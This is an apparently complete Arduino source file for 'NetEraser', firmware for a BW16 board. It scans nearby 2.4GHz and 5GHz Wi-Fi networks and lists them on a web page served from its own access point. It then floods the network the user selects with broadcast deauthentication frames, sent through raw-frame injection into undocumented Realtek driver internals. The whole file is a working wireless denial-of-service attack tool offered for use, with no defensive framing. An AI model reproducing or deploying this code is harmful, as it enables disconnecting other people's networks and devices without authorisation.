/*
 * NetEraser
 * A tool that deauthenticates 2.4GHz and 5GHz Wi-Fi networks using BW16.
 * Author - WireBits
 */

#include <map>
#include <vector>
#include <WiFi.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <wifi_structures.h>

#define FRAMES_PER_DEAUTH 5

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

char *ssid = "NetEraser";
char *pass = "neteraser";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis;
WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

int scanNetworks() {
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    return 0;
  } else {
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void sendWifiRawManagementFrames(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

void sendDeauthenticationFrames(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  sendWifiRawManagementFrames(&frame, sizeof(DeauthFrame));
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

std::vector<std::pair<String, String>> parsePost(String &request){
    std::vector<std::pair<String, String>> post_params;
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params;
    }
    body_start += 4;
    String post_data = request.substring(body_start);
    int start = 0;
    int end = post_data.indexOf('&', start);
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');
        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value});
        }
        start = end + 1;
        end = post_data.indexOf('&', start);
    }
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }
    return post_params;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>NetEraser</title>
      <style>
        body{background-color: #000000; color: white; text-align: center; font-family: Arial, sans-serif;}
        h1{font-size: 1.4rem;margin-bottom: 10px;padding: 10px;border: 2px solid #FFC72C;font-weight: 100;letter-spacing: 5px;background-color: #000000;color: white;display: inline-block;}
        table{width: 80%; margin: auto; border-collapse: collapse; border: 2px solid #87CEEB; margin-bottom: 20px;}
        th,td{border: 1px solid #87CEEB; padding: 12px; text-align: center;}
        th{background-color: #000000;}
        form{background-color: black;padding: 20px;border-radius: 5px;box-shadow: 0 2px 5px rgba(0,0,0,0.1);margin-bottom: 20px;width: 100%;}
        input[type="submit"]{background-color: #00AB66;color: white;border: none;padding: 15px 30px;font-size: 20px;cursor: pointer;border-radius: 5px;display: block;margin: 20px auto;text-align: center;width: 200px;}
        input[type="submit"]:hover{background-color: #00AB66;}
      </style>
  </head>
  <body>
      <h1>NetEraser</h1>
      <form method="post" action="/deauth">
          <table>
              <tr>
                  <th>Number</th>
                  <th>SSID</th>
                  <th>BSSID</th>
                  <th>Channel</th>
                  <th>RSSI</th>
                  <th>Frequency</th>
                  <th>Select</th>
              </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td>" + String(i) + "</td>";
    response += "<td>" + scan_results[i].ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "<td><input type='radio' name='network' value='" + String(i) + "'></td>";
    response += "</tr>";
  }

  response += R"(
        </table>
          <input type="submit" value="Start">
      </form>
  </body>
  </html>
  )";

  client.write(response.c_str());
}
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks()){
    delay(1000);
  }
  server.begin();
  digitalWrite(LED_G, HIGH);
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while (client.available()) {
      while (client.available()) request += (char)client.read();
      delay(1);
    }
    String path = parseRequest(request);

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      while (scanNetworks()) {
        delay(1000);
      }
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      if (post_data.size() >= 1) {
        for (auto &param : post_data) {
          if (param.first == "network") {
            deauth_wifis.push_back(String(param.second).toInt());
          }
        }
      }
    } else {
      handle404(client);
    }
    client.stop();
    digitalWrite(LED_G, LOW);
  }
  uint32_t current_num = 0;
  while (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_B, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      sendDeauthenticationFrames(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_B, LOW);
    delay(50);
  }
}
